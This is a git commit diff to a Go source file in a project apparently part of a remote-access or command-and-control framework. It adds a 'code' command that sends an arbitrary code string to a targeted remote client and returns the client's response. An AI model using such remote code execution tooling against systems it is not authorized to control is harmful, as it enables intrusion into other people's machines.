8693b7a6305c7338689cd1332f33e55d8f887249
0x1a8510f2 <admin@0x1a8510f2.space>
2023-06-24 02:15:19 +0100

    chore: working code snippet

--- cmd/pc3/snippets/code.go
+++ cmd/pc3/snippets/code.go
@@ -1,16 +1,19 @@
 package snippets
 
 import (
+	"fmt"
+	"strings"
+	"time"
+
 	"dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms/cmd/pc3/lib"
 )
 
 func snippetCode(ctx lib.CommandContext, arg string) (string, error) {
-	/*target, _, _ := strings.Cut(arg, " ")
-	response, err := sendRRToClientAwaitResponse(ctx, target, &proto.PacketRR{}) // TODO: Actually make the packet.
+	target, code, _ := strings.Cut(arg, " ")
+	res, err := sendRRToClientAwaitResponse(ctx, target, []byte(code), time.Minute)
 	if err != nil {
-		return "", fmt.Errorf("failed to execute code snippet for client `%s` due to error: %s", target, err.Error())
-	}*/
+		return "", fmt.Errorf("failed to execute `code` snippet for client `%s` due to error: %s", target, err.Error())
+	}
 
-	// TODO: Parse response and send the screenshot.
-	return "", nil
+	return fmt.Sprintf("client response from `%s`: %s", target, string(res.Payload)), nil
 }
